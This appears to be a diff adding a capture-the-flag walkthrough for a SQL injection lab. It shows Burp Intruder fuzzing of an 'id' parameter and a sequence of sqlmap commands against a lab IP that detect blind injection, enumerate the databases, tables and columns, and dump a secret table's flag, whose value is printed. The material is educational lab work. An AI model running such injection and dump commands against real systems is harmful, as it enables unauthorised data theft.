@@ -390,5 +390,114 @@ After successfully testing the patched code, the flag is revealed:
 
 ---
 
+# 🔐 LAB5: Sqill – SQL Injection Challenge
+
+You have to find a couple vulnerabilities to prove your Skill! Find a secret string hidden deeply in this application and find out how to read private articles.
+
+
+---
+
+## 🧭 Lab Walkthrough
+
+### 1. 🎯 Initial Steps
+
+- Open the target machine.
+- Open the browser and explore the site.
+- Analyze the behavior — based on the hint: **"check the `id`"** parameter.
+- Open **Burp Suite** and intercept the requests.
+- Using Intruder, test IDs from `1` to `100` and check for HTTP `200 OK` responses.
+  - ✅ Multiple `200` responses suggest valid resource paths.
+
+---
+
+### 2. 🛠️ Using SQLMap
+
+We now move to terminal to automate further exploitation using `sqlmap`.
+
+#### 🔍 Detect Injection Point
+
+```bash
+sqlmap -u "http://10.0.2.10/note/1*" --batch --level=1 --risk=1
+````
+
+* SQLMap detects **two injection techniques**:
+
+  * ✅ Boolean-based blind
+  * ✅ AND/OR time-based blind
+
+#### 📢 Grab the DBMS Banner
+
+```bash
+sqlmap -u "http://10.0.2.10/note/1*" --batch --banner
+```
+
+* Result:
+
+  * DBMS: `MariaDB 10.3.22`
+  * Web server: `nginx/1.14.2`
+
+---
+
+### 3. 📂 Database Enumeration
+
+#### 🧾 List All Databases
+
+```bash
+sqlmap -u "http://10.0.2.10/note/1*" --batch --dbs
+```
+
+* Databases Found:
+
+  * `information_schema`
+  * `notes`
+
+#### 📚 List Tables in `notes`
+
+```bash
+sqlmap -u "http://10.0.2.10/note/1*" --batch -D notes --tables
+```
+
+* Tables Found:
+
+  * `user`
+  * `note`
+  * `secret`
+  * and others...
+
+#### 📌 Check `secret` Table Columns
+
+```bash
+sqlmap -u "http://10.0.2.10/note/1*" --batch -D notes -T secret --columns
+```
+
+* Column found: `flag`
+
+---
+
+### 4. 🏁 Dump the Flag
+
+```bash
+sqlmap -u "http://10.0.2.10/note/1*" --batch -D notes -T secret -C flag --dump
+```
+
+* ✅ Flag extracted: `Yt_an0The_SQL`
+
+---
+
+## 📓 Notes
+
+* 💡 Use Burp to explore hidden behaviors before running automated tools.
+* ✅ Always identify valid paths and injection types manually first.
+* 🎯 SQLMap is powerful, but only if you understand the target's structure.
+* 🔐 Flag captured: `Yt_an0The_SQL`
+
+---
+
+## ✅ Good luck from Kader!
+
+
+
+
+
 
 
